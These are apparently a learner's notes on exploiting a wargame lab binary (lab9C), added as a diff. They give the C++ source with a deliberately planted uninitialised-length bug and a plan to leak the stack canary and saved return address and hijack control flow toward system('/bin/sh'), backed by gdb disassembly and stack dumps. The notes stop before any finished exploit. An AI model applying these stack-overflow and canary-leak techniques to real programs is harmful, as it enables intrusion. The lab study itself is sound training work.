@@ -1,0 +1,970 @@
+Already read the writeup from devel0pment.de, know how to crack this:
+
+/*
+ *  compile: g++ -fstack-protector-all -z relro -z now ./lab9C.cpp -o lab9C
+ *
+ *  DSVector - A basic homwork implementation of std::vector
+ *  This is a wrapper program to test it!
+ */
+
+#include <iostream>
+#include <limits>
+#include <cstdlib>
+#include <cstdio>
+#include <cstring>
+#include <unistd.h>
+#include "utils.h"
+
+ENABLE_TIMEOUT(60)
+
+void
+print_menu(void)
+{
+    printf("+------- DSVector Test Menu -------+\n"
+           "| 1. Append item                   |\n"
+           "| 2. Read item                     |\n"
+           "| 3. Quit                          |\n"
+           "+----------------------------------+\n");
+}
+
+template <class T>
+class DSVector {
+    public:
+                     // I don't like indexing from 0, I learned VB.NET first.
+        DSVector() : len(1), alloc_len(len+256) {} // these happen
+        unsigned int size() { return len; }
+        void append(T item);
+                                            // No info leaks, either!
+        T get(unsigned int index) { return (index < alloc_len ? vector_data[index] : -1); };
+    private:
+        unsigned int alloc_len;
+        unsigned int len;
+        // I was asleep during the dynamic sizing part, at least you can't overflow!
+        T vector_data[1+256];
+};
+
+template <class T>
+void
+DSVector<T>::append(T item)
+{
+    // No overflow for you!
+    if (len >= alloc_len) {
+        std::cout << "Vector is full!" << std::endl;
+        return;
+    }
+    vector_data[this->len++] = item;
+}
+
+int 
+main(int argc, char *argv[])
+{
+    DSVector<int> test1;
+    unsigned int choice = 0;
+    bool done = false;
+    disable_buffering(stdout);
+
+    while (!done) {
+        print_menu();
+        std::cout << "Enter choice: ";
+        choice = get_unum();
+
+        /* handle menu selection */
+        switch (choice) {
+        case 1:
+            std::cout << "Enter a number: ";
+            choice = get_unum();
+            test1.append(choice);
+            break;
+        case 2:
+            std::cout << "Choose an index: ";
+            choice = get_unum();
+            printf("DSVector[%d] = %d\n", choice, test1.get(choice));
+            break;
+        case 3:
+            done = true;
+            break;
+        default:
+            puts("Invalid choice!");
+            break;
+        }
+    }
+
+    return EXIT_SUCCESS;
+}
+
+So these two
+         DSVector() : len(1), alloc_len(len+256) { }
+		 
+actually happen in the opposite order.
+
+because of this:
+
+    private:
+        unsigned int alloc_len;
+        unsigned int len;
+		
+Which means that the alloc_len is going to be len+256 when len is still uninitialized and happens to contain high heavy values then.
+
+Thus, we can not only read anything we want (with a positive offset) due to lack of checks in 'Read item', but also overflow it in append - but that means we need to literally add 256 numbers in order to do so.
+
+But can we overwrite the vtable this way?
+
+I don't think there is one, there are no virtual methods here. Also, as far as I remember this was not the way we were supposed to pwn this. We can just overflow the buffer, byte after byte - and mess with the saved RET, while overflowing the saved RET with its value we leak via the ouf of bound read.
+
+We also leak out the saved EBP, so we know where our /bin/sh is.
+
+How about the address of system? I know we can ROP this, but I guess we want to get back again to the write up.
+
+Eh fuck it's not so much fun when we just read it.
+
+OK, let's do it anyway.
+
+   0x00000f15 <+262>:   call   0xa80 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
+   0x00000f1a <+267>:   call   0xcd9 <_Z8get_unumv>
+   0x00000f1f <+272>:   mov    DWORD PTR [esp+0x2c],eax
+   0x00000f23 <+276>:   mov    eax,DWORD PTR [esp+0x2c]
+   0x00000f27 <+280>:   mov    DWORD PTR [esp+0x4],eax
+   0x00000f2b <+284>:   lea    eax,[esp+0x30]
+   0x00000f2f <+288>:   mov    DWORD PTR [esp],eax
+   0x00000f32 <+291>:   call   0x112a <_ZN8DSVectorIiE3getEj>
+   0x00000f37 <+296>:   mov    DWORD PTR [esp+0x8],eax
+   0x00000f3b <+300>:   mov    eax,DWORD PTR [esp+0x2c]
+   0x00000f3f <+304>:   mov    DWORD PTR [esp+0x4],eax
+   0x00000f43 <+308>:   lea    eax,[ebx-0x1c6d]
+   0x00000f49 <+314>:   mov    DWORD PTR [esp],eax
+   0x00000f4c <+317>:   call   0xac0 <printf@plt>	<-- this looks like printing out the given vector
+   0x00000f51 <+322>:   jmp    0xf69 <main+346>
+   0x00000f53 <+324>:   mov    BYTE PTR [esp+0x2b],0x1
+   0x00000f58 <+329>:   jmp    0xf69 <main+346>
+   0x00000f5a <+331>:   lea    eax,[ebx-0x1c5a]
+   0x00000f60 <+337>:   mov    DWORD PTR [esp],eax
+   0x00000f63 <+340>:   call   0xb00 <puts@plt>
+   0x00000f68 <+345>:   nop
+   0x00000f69 <+346>:   movzx  eax,BYTE PTR [esp+0x2b]
+   0x00000f6e <+351>:   xor    eax,0x1
+   0x00000f71 <+354>:   test   al,al
+   0x00000f73 <+356>:   jne    0xe8a <main+123>
+   0x00000f79 <+362>:   mov    eax,0x0
+   0x00000f7e <+367>:   mov    edx,DWORD PTR [esp+0x43c]
+   0x00000f85 <+374>:   xor    edx,DWORD PTR gs:0x14
+   0x00000f8c <+381>:   je     0xf93 <main+388>
+   0x00000f8e <+383>:   call   0x1200 <__stack_chk_fail_local>
+   0x00000f93 <+388>:   mov    ebx,DWORD PTR [ebp-0x4]
+   0x00000f96 <+391>:   leave
+   0x00000f97 <+392>:   ret
+End of assembler dump.
+gdb-peda$
+
+Enter choice: 2
+Choose an index: 300
+DSVector[300] = 0
++------- DSVector Test Menu -------+
+| 1. Append item                   |
+| 2. Read item                     |
+| 3. Quit                          |
++----------------------------------+
+Enter choice: 2
+Choose an index: 1
+DSVector[1] = -1208859636
++------- DSVector Test Menu -------+
+| 1. Append item                   |
+| 2. Read item                     |
+| 3. Quit                          |
++----------------------------------+
+Enter choice: 2
+Choose an index: 400
+DSVector[400] = 1027888976
++------- DSVector Test Menu -------+
+| 1. Append item                   |
+| 2. Read item                     |
+| 3. Quit                          |
++----------------------------------+
+Enter choice: 2
+Choose an index: 500
+DSVector[500] = 993079357
++------- DSVector Test Menu -------+
+| 1. Append item                   |
+| 2. Read item                     |
+| 3. Quit                          |
++----------------------------------+
+Enter choice: 2
+Choose an index: 700
+DSVector[700] = 1818635818
++------- DSVector Test Menu -------+
+| 1. Append item                   |
+| 2. Read item                     |
+| 3. Quit                          |
++----------------------------------+
+Enter choice: 2
+Choose an index: 1000
+Segmentation fault (core dumped)
+
+
+
+   0x00000f23 <+276>:   mov    eax,DWORD PTR [esp+0x2c]
+   0x00000f27 <+280>:   mov    DWORD PTR [esp+0x4],eax
+   0x00000f2b <+284>:   lea    eax,[esp+0x30]
+   0x00000f2f <+288>:   mov    DWORD PTR [esp],eax
+   0x00000f32 <+291>:   call   0x112a <_ZN8DSVectorIiE3getEj>
+   0x00000f37 <+296>:   mov    DWORD PTR [esp+0x8],eax
+   0x00000f3b <+300>:   mov    eax,DWORD PTR [esp+0x2c]
+   0x00000f3f <+304>:   mov    DWORD PTR [esp+0x4],eax
+   0x00000f43 <+308>:   lea    eax,[ebx-0x1c6d]
+   0x00000f49 <+314>:   mov    DWORD PTR [esp],eax
+   0x00000f4c <+317>:   call   0xac0 <printf@plt>
+   0x00000f51 <+322>:   jmp    0xf69 <main+346>
+   0x00000f53 <+324>:   mov    BYTE PTR [esp+0x2b],0x1
+   0x00000f58 <+329>:   jmp    0xf69 <main+346>
+   0x00000f5a <+331>:   lea    eax,[ebx-0x1c5a]
+   0x00000f60 <+337>:   mov    DWORD PTR [esp],eax
+   0x00000f63 <+340>:   call   0xb00 <puts@plt>
+   0x00000f68 <+345>:   nop
+   0x00000f69 <+346>:   movzx  eax,BYTE PTR [esp+0x2b]
+   0x00000f6e <+351>:   xor    eax,0x1
+   0x00000f71 <+354>:   test   al,al
+   0x00000f73 <+356>:   jne    0xe8a <main+123>
+   0x00000f79 <+362>:   mov    eax,0x0
+   0x00000f7e <+367>:   mov    edx,DWORD PTR [esp+0x43c]
+   0x00000f85 <+374>:   xor    edx,DWORD PTR gs:0x14
+   0x00000f8c <+381>:   je     0xf93 <main+388>
+   0x00000f8e <+383>:   call   0x1200 <__stack_chk_fail_local>
+   0x00000f93 <+388>:   mov    ebx,DWORD PTR [ebp-0x4]
+   0x00000f96 <+391>:   leave
+   0x00000f97 <+392>:   ret
+End of assembler dump.
+gdb-peda$ break *(main+291)
+
+
+
+Enter choice: 2
+Choose an index: 1
+[----------------------------------registers-----------------------------------]
+EAX: 0xbffff2f0 --> 0xb7fe6ecd (<do_lookup_x+141>:      add    al,0xb8)
+EBX: 0x80002f8c --> 0x2e8c
+ECX: 0xb7ee68a4 --> 0x0
+EDX: 0x0
+ESI: 0x0
+EDI: 0x0
+EBP: 0xbffff708 --> 0x0
+ESP: 0xbffff2c0 --> 0xbffff2f0 --> 0xb7fe6ecd (<do_lookup_x+141>:       add    al,0xb8)
+EIP: 0x80000f32 (<main+291>:    call   0x8000112a <_ZN8DSVectorIiE3getEj>)
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80000f27 <main+280>:       mov    DWORD PTR [esp+0x4],eax
+   0x80000f2b <main+284>:       lea    eax,[esp+0x30]
+   0x80000f2f <main+288>:       mov    DWORD PTR [esp],eax
+=> 0x80000f32 <main+291>:       call   0x8000112a <_ZN8DSVectorIiE3getEj>
+   0x80000f37 <main+296>:       mov    DWORD PTR [esp+0x8],eax
+   0x80000f3b <main+300>:       mov    eax,DWORD PTR [esp+0x2c]
+   0x80000f3f <main+304>:       mov    DWORD PTR [esp+0x4],eax
+   0x80000f43 <main+308>:       lea    eax,[ebx-0x1c6d]
+Guessed arguments:
+arg[0]: 0xbffff2f0 --> 0xb7fe6ecd (<do_lookup_x+141>:   add    al,0xb8)
+arg[1]: 0x1
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff2c0 --> 0xbffff2f0 --> 0xb7fe6ecd (<do_lookup_x+141>:      add    al,0xb8) <-- this pointer
+0004| 0xbffff2c4 --> 0x1 <-- the number we gave on input
+0008| 0xbffff2c8 --> 0x2
+0012| 0xbffff2cc --> 0x0
+0016| 0xbffff2d0 --> 0x0
+0020| 0xbffff2d4 --> 0xb7fe6dcd (<check_match+285>:     mov    ecx,DWORD PTR [esp+0x1c])
+0024| 0xbffff2d8 --> 0xbffff7a4 --> 0xbffff8c2 ("/levels/lab09/lab9C")
+0028| 0xbffff2dc --> 0x1
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x80000f32 in main ()
+gdb-peda$ x  0xbffff2c0
+0xbffff2c0:     0xbffff2f0 <-- this 
+
+
+Yup.
+
+
+gdb-peda$ s
+[----------------------------------registers-----------------------------------]
+EAX: 0xbffff2f0 --> 0xb7fe6ecd (<do_lookup_x+141>:      add    al,0xb8)
+EBX: 0x80002f8c --> 0x2e8c
+ECX: 0xb7ee68a4 --> 0x0
+EDX: 0x0
+ESI: 0x0
+EDI: 0x0
+EBP: 0xbffff708 --> 0x0
+ESP: 0xbffff2bc --> 0x80000f37 (<main+296>:     mov    DWORD PTR [esp+0x8],eax)
+EIP: 0x8000112a (<_ZN8DSVectorIiE3getEj>:       push   ebp)
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80001127 <_ZN8DSVectorIiE6appendEi+145>:   pop    ebx
+   0x80001128 <_ZN8DSVectorIiE6appendEi+146>:   pop    ebp
+   0x80001129 <_ZN8DSVectorIiE6appendEi+147>:   ret
+=> 0x8000112a <_ZN8DSVectorIiE3getEj>:  push   ebp
+   0x8000112b <_ZN8DSVectorIiE3getEj+1>:        mov    ebp,esp
+   0x8000112d <_ZN8DSVectorIiE3getEj+3>:        sub    esp,0x28
+   0x80001130 <_ZN8DSVectorIiE3getEj+6>:        mov    eax,DWORD PTR [ebp+0x8]
+   0x80001133 <_ZN8DSVectorIiE3getEj+9>:        mov    DWORD PTR [ebp-0x1c],eax
+   
+
+gdb-peda$ vmmap
+Start      End        Perm      Name
+0x80000000 0x80002000 r-xp      /levels/lab09/lab9C
+0x80002000 0x80003000 r--p      /levels/lab09/lab9C
+0x80003000 0x80004000 rw-p      /levels/lab09/lab9C
+0xb7cd5000 0xb7cd7000 rw-p      mapped
+0xb7cd7000 0xb7cf3000 r-xp      /lib/i386-linux-gnu/libgcc_s.so.1
+0xb7cf3000 0xb7cf4000 rw-p      /lib/i386-linux-gnu/libgcc_s.so.1
+0xb7cf4000 0xb7d38000 r-xp      /lib/i386-linux-gnu/libm-2.19.so
+0xb7d38000 0xb7d39000 r--p      /lib/i386-linux-gnu/libm-2.19.so
+0xb7d39000 0xb7d3a000 rw-p      /lib/i386-linux-gnu/libm-2.19.so
+0xb7d3a000 0xb7d3b000 rw-p      mapped
+0xb7d3b000 0xb7ee3000 r-xp      /lib/i386-linux-gnu/libc-2.19.so
+0xb7ee3000 0xb7ee5000 r--p      /lib/i386-linux-gnu/libc-2.19.so
+0xb7ee5000 0xb7ee6000 rw-p      /lib/i386-linux-gnu/libc-2.19.so
+0xb7ee6000 0xb7ee9000 rw-p      mapped
+0xb7ee9000 0xb7fc5000 r-xp      /usr/lib/i386-linux-gnu/libstdc++.so.6.0.19
+0xb7fc5000 0xb7fc9000 r--p      /usr/lib/i386-linux-gnu/libstdc++.so.6.0.19
+0xb7fc9000 0xb7fca000 rw-p      /usr/lib/i386-linux-gnu/libstdc++.so.6.0.19
+0xb7fca000 0xb7fd1000 rw-p      mapped
+0xb7fd8000 0xb7fdb000 rw-p      mapped
+0xb7fdb000 0xb7fdc000 r-xp      [vdso]
+0xb7fdc000 0xb7fde000 r--p      [vvar]
+0xb7fde000 0xb7ffe000 r-xp      /lib/i386-linux-gnu/ld-2.19.so
+0xb7ffe000 0xb7fff000 r--p      /lib/i386-linux-gnu/ld-2.19.so
+0xb7fff000 0xb8000000 rw-p      /lib/i386-linux-gnu/ld-2.19.so
+0xbffdf000 0xc0000000 rw-p      [stack]
+
+
+So, this is where we get the segfault:
+
+   0x80001154 <_ZN8DSVectorIiE3getEj+42>:       mov    edx,DWORD PTR [ebp-0x20]
+=> 0x80001157 <_ZN8DSVectorIiE3getEj+45>:       mov    eax,DWORD PTR [eax+edx*4+0x8]
+   0x8000115b <_ZN8DSVectorIiE3getEj+49>:       jmp    0x80001162 <_ZN8DSVectorIiE3getEj+56>
+   0x8000115d <_ZN8DSVectorIiE3getEj+51>:       mov    eax,0xffffffff
+   0x80001162 <_ZN8DSVectorIiE3getEj+56>:       mov    ecx,DWORD PTR [ebp-0xc]
+   0x80001165 <_ZN8DSVectorIiE3getEj+59>:       xor    ecx,DWORD PTR gs:0x14
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff290 --> 0x80001230 --> 0x7525 ('%u')
+0004| 0xbffff294 --> 0xbffff2a8 --> 0x539
+0008| 0xbffff298 --> 0x539
+0012| 0xbffff29c --> 0xbffff2f0 --> 0xb7fe6ecd (<do_lookup_x+141>:      add    al,0xb8)
+0016| 0xbffff2a0 --> 0xb7fcf140 --> 0xb7fc766c --> 0xb7f6c000 (<_ZNSoD1Ev>:     push   ebx)
+0020| 0xbffff2a4 --> 0x8000130d ("Choose an index: ")
+0024| 0xbffff2a8 --> 0x539
+0028| 0xbffff2ac --> 0xc5a15f00
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x80001157 in DSVector<int>::get(unsigned int) ()
+gdb-peda$ p eax+edx*4+0x8
+No symbol "eax" in current context.
+gdb-peda$ p $eax+$edx*4+0x8
+$1 = 0xc00007dc
+gdb-peda$ p $eax
+$2 = 0xbffff2f0
+gdb-peda$ p $edx
+$3 = 0x539
+gdb-peda$ p $edx*4
+$4 = 0x14e4
+gdb-peda$ p $edx*0x4
+$5 = 0x14e4
+gdb-peda$ p $edx*$0x4
+Argument to arithmetic operation not a number or boolean.
+gdb-peda$ p $edx*0x4
+$6 = 0x14e4
+gdb-peda$ p $eax+$edx*4+0x8
+$7 = 0xc00007dc
+gdb-peda$ p $edx*4+0x8
+$8 = 0x14ec
+gdb-peda$ p $edx*4
+$9 = 0x14e4
+gdb-peda$ p $eax
+$10 = 0xbffff2f0
+gdb-peda$ p $eax+0x14ec
+$11 = 0xc00007dc
+gdb-peda$ vmmap
+Start      End        Perm      Name
+0x80000000 0x80002000 r-xp      /levels/lab09/lab9C
+0x80002000 0x80003000 r--p      /levels/lab09/lab9C
+0x80003000 0x80004000 rw-p      /levels/lab09/lab9C
+0xb7cd5000 0xb7cd7000 rw-p      mapped
+0xb7cd7000 0xb7cf3000 r-xp      /lib/i386-linux-gnu/libgcc_s.so.1
+0xb7cf3000 0xb7cf4000 rw-p      /lib/i386-linux-gnu/libgcc_s.so.1
+0xb7cf4000 0xb7d38000 r-xp      /lib/i386-linux-gnu/libm-2.19.so
+0xb7d38000 0xb7d39000 r--p      /lib/i386-linux-gnu/libm-2.19.so
+0xb7d39000 0xb7d3a000 rw-p      /lib/i386-linux-gnu/libm-2.19.so
+0xb7d3a000 0xb7d3b000 rw-p      mapped
+0xb7d3b000 0xb7ee3000 r-xp      /lib/i386-linux-gnu/libc-2.19.so
+0xb7ee3000 0xb7ee5000 r--p      /lib/i386-linux-gnu/libc-2.19.so
+0xb7ee5000 0xb7ee6000 rw-p      /lib/i386-linux-gnu/libc-2.19.so
+0xb7ee6000 0xb7ee9000 rw-p      mapped
+0xb7ee9000 0xb7fc5000 r-xp      /usr/lib/i386-linux-gnu/libstdc++.so.6.0.19
+0xb7fc5000 0xb7fc9000 r--p      /usr/lib/i386-linux-gnu/libstdc++.so.6.0.19
+0xb7fc9000 0xb7fca000 rw-p      /usr/lib/i386-linux-gnu/libstdc++.so.6.0.19
+0xb7fca000 0xb7fd1000 rw-p      mapped
+0xb7fd8000 0xb7fdb000 rw-p      mapped
+0xb7fdb000 0xb7fdc000 r-xp      [vdso]
+0xb7fdc000 0xb7fde000 r--p      [vvar]
+0xb7fde000 0xb7ffe000 r-xp      /lib/i386-linux-gnu/ld-2.19.so
+0xb7ffe000 0xb7fff000 r--p      /lib/i386-linux-gnu/ld-2.19.so
+0xb7fff000 0xb8000000 rw-p      /lib/i386-linux-gnu/ld-2.19.so
+0xbffdf000 0xc0000000 rw-p      [stack]
+gdb-peda$
+
+0xbffff2f0 (EAX) is just the beginning of the DSVector<int> test1 array.
+
+edx*4+0x8 is the index to read from.
+
+So, let's fill the vector with 257 elements (1337):
+
+
+
+gdb-peda$ x/600wx $esp
+0xbffff250:     0xbffff280      0x00000001      0x00000002      0x00000000
+0xbffff260:     0x00000000      0xb7fe6dcd      0xbffff734      0x00000001
+0xbffff270:     0x00000000      0xb7fea8f0      0x00fff578      0x00000001
+0xbffff280:     0xb7fe6ecd      0x00000101      0xb7d4dffd      0x13371337
+0xbffff290:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff2a0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff2b0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff2c0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff2d0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff2e0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff2f0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff300:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff310:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff320:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff330:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff340:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff350:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff360:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff370:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff380:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff390:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff3a0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff3b0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff3c0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff3d0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff3e0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff3f0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff400:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff410:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff420:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff430:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff440:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff450:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff460:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff470:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff480:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff490:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff4a0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff4b0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff4c0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff4d0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff4e0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff4f0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff500:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff510:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff520:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff530:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff540:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff550:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff560:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff570:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff580:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff590:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff5a0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff5b0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff5c0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff5d0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff5e0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff5f0:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff600:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff610:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff620:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff630:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff640:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff650:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff660:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff670:     0x13371337      0x13371337      0x13371337      0x13371337
+0xbffff680:     0x13371337      0x13371337      0x13371337      0x18e92800 <-- stack canary
+0xbffff690:     0x80001180      0xb7ee5000      0x00000000      0xb7d54a83 <-- saved RET
+0xbffff6a0:     0x00000001      0xbffff734      0xbffff73c      0xb7feccea
+0xbffff6b0:     0x00000001      0xbffff734      0xbffff73c      0x00000008
+0xbffff6c0:     0xbffff730      0xb7ee5000      0x00000000      0x00000000
+0xbffff6d0:     0x00000000      0x886bc9bb      0xdd120dab      0x00000000
+0xbffff6e0:     0x00000000      0x00000000      0xb7fde000      0x0000055c
+
+
+gdb-peda$ searchmem 0x18e92800 0xbffdf000 0xc0000000
+Searching for '0x18e92800' in range: 0xbffdf000 - 0xc0000000
+Found 3 results, display max 3 items:
+[stack] : 0xbffff20c --> 0x18e92800
+[stack] : 0xbffff23c --> 0x18e92800
+[stack] : 0xbffff68c --> 0x18e92800
+
+Anyway, I suggest creating another breakpoint here just to see the buffer before filling.
+0x80000e42 <+51>:    xor    eax,eax
+
+b *(main+51)
+b *(main+291)
+
+ESP from the kernel vsyscall (right after attaching with gdb) - hence ESP will differ:
+
+gdb-peda$ x/1000wx $esp
+0xbfffef88:     0xb7cd6940      0x00000400      0xb7fd8000      0xb7e15bf3
+0xbfffef98:     0xb7ee5000      0xb7daac73      0x00000000      0xb7fd8000
+0xbfffefa8:     0x00000400      0x0001bbb4      0x00000000      0xb7fe6dcd
+0xbfffefb8:     0xb7d4dffd      0xb7ee5000      0xb7ee5c20      0x00000000
+0xbfffefc8:     0xbffff1f8      0xb7dabb59      0xb7ee5c20      0x00000002
+0xbfffefd8:     0xb7f2422a      0xb7fdaacc      0xb7cd87c6      0xb7fff000
+0xbfffefe8:     0xb7ee5c20      0xb7dab98b      0xb7ee5c20      0xb7fe7524
+0xbfffeff8:     0xbffff278      0xb7fe61c4      0xbffff05c      0xb7ee5000
+0xbffff008:     0xb7ee5c20      0xb7d8bbdd      0xb7ee5c20      0x07f3b750
+0xbffff018:     0xfe76ea16      0xb7d3eec8      0xb7d45868      0xb7fe6dcd
+0xbffff028:     0xb7d3a604      0x00000006      0xbffff060      0x06404d59
+0xbffff038:     0xc809ab36      0xb7eeea5c      0xb7ee3ce0      0x00000000
+0xbffff048:     0x00000001      0xb7e9d7bc      0x00000000      0x00000000
+0xbffff058:     0x00f0048c      0x00000000      0xbffff224      0x00000000
+0xbffff068:     0x00000000      0x00000000      0x00000000      0x80001231
+0xbffff078:     0xb7ee58a0      0x00000000      0x00000000      0x00000000
+0xbffff088:     0xb7cd6940      0x80001232      0xffffffff      0x00000000
+0xbffff098:     0x00000000      0xb7d3a875      0x00000000      0xffffffac
+0xbffff0a8:     0x00000000      0xb7ee58a0      0xbffff118      0x00000000
+0xbffff0b8:     0x00000000      0xb7d3a6e0      0x00000001      0xb7d90f10
+0xbffff0c8:     0xb7ee5c20      0x00000000      0xbffff184      0xbffff0f8
+0xbffff0d8:     0xbffff0f0      0xb7f0048c      0xb7fda860      0x00000000
+0xbffff0e8:     0xbffff1f4      0x00000000      0xffffffff      0xbffff118
+0xbffff0f8:     0xb7d45868      0xb7fdab28      0xb7fda860      0x00000000
+0xbffff108:     0xb7ee5ac0      0x0000000e      0x800012ed      0xb7e15c73
+0xbffff118:     0xb7ee5000      0xb7da9ba1      0x00000001      0x800012ed
+0xbffff128:     0x0000000e      0xb7daaeed      0xb7ee5ac0      0xb7ee5b54
+0xbffff138:     0x800012ed      0xb7da8ddf      0xb7ee5ac0      0x800012ed
+0xbffff148:     0x0000000e      0xb7ee5000      0x0000000e      0xb7ee5ac0
+0xbffff158:     0x0000000e      0xb7daa252      0x0000000e      0xffffffff
+0xbffff168:     0xbffff184      0x0000000e      0xb7efd70c      0xb7eeefcc
+0xbffff178:     0x00000000      0xb7ee5000      0xb7ee5ac0      0x0000000e
+0xbffff188:     0xb7cd6940      0xb7d9f702      0xb7ee5ac0      0x800012ed
+0xbffff198:     0x0000000e      0xb7fcf144      0xbffff698      0xb7ff2500
+0xbffff1a8:     0xb7fc75a8      0xb7fc9000      0xb7fcf140      0xb7fcf144
+0xbffff1b8:     0xbffff698      0xb7f6b526      0x800012ed      0x00000001
+0xbffff1c8:     0x0000000e      0xb7ee5ac0      0xb7fc9000      0xb7fcf140
+0xbffff1d8:     0xb7fc9000      0xb7da8bce      0xb7fced40      0x800012ed
+0xbffff1e8:     0xb7d883a1      0xb7ee5000      0x00000000      0x00000000
+0xbffff1f8:     0xbffff248      0xb7d90027      0xb7ee5c20      0x80001230
+0xbffff208:     0xbffff224      0x00000000      0x80002f8c      0x00000000
+0xbffff218:     0x80002f8c      0x80000d22      0x80001230      0xbffff238
+0xbffff228:     0xbffff698      0xb7f6d3f5      0xb7fcf140      0x800012ed
+0xbffff238:     0x00000000      0x6784a800      0x80002f8c      0x80002f8c
+0xbffff248:     0xbffff698      0x80000eac      0xb7fcf140      0x800012ed
+0xbffff258:     0x00000002      0x00000000      0x00000000      0xb7fe6dcd
+0xbffff268:     0xbffff734      0x00000001      0x00000000      0xb7fea8f0
+0xbffff278:     0x00fff578      0x00000000      0xb7fe6ecd      0x00000001
+0xbffff288:     0xb7d4dffd      0xb7f2440c      0x00000000      0xb7fff000
+0xbffff298:     0xb7d3d034      0x00000002      0xb7d3a604      0x00000002
+0xbffff2a8:     0xb7f2422a      0xb7fdaacc      0xbffff2a0      0xb7fff000
+0xbffff2b8:     0xb7d3ec80      0x00000002      0xb7d3a604      0xb7fe7524
+0xbffff2c8:     0xb7f2422a      0xb7fdaacc      0xb7d409e8      0xb7fe6dcd
+0xbffff2d8:     0xb7d3a604      0x00000006      0xbffff310      0x00e49cb2
+0xbffff2e8:     0x1c93965e      0xb7d3eec8      0xb7d47b18      0xb7fe6dcd
+0xbffff2f8:     0xb7f24270      0xb7f24270      0xbffff330      0xb7fff000
+0xbffff308:     0xb7eebbbc      0x00000001      0x00000000      0x00000000
+0xbffff318:     0x00000001      0x000008c5      0xb7d3a8c0      0xb7fdab28
+0xbffff328:     0xb7efeab1      0xb7d48438      0xb7eef25c      0x00000001
+0xbffff338:     0x72f4b9f8      0xb7eeea5c      0xb7ef1c8c      0xb7fff000
+0xbffff348:     0xbffff454      0xb7fdaa18      0xbffff410      0xb7fe77aa
+0xbffff358:     0xbffff3c0      0xb7eef25c      0xbffff3c8      0xb7fffa94
+0xbffff368:     0x00000000      0xb7d3a8c0      0x00000001      0xb7fe6dcd
+0xbffff378:     0xb7f24270      0xb7f24270      0x00000000      0xb7fff000
+0xbffff388:     0xb7eedfa8      0x00000001      0xb7d3a604      0x00000002
+0xbffff398:     0xb7f24270      0xb7f24270      0xbffff454      0xb7fff000
+0xbffff3a8:     0xb7eebe40      0x00000001      0xb7d3a604      0xb7fe7524
+0xbffff3b8:     0xb7f24270      0xb7f24270      0xffffffff      0xb7fff000
+0xbffff3c8:     0xb7d3a604      0x00000006      0xbffff400      0x018438b6
+0xbffff3d8:     0x308716da      0xb7eeea5c      0xb7ef269c      0xb7fff000
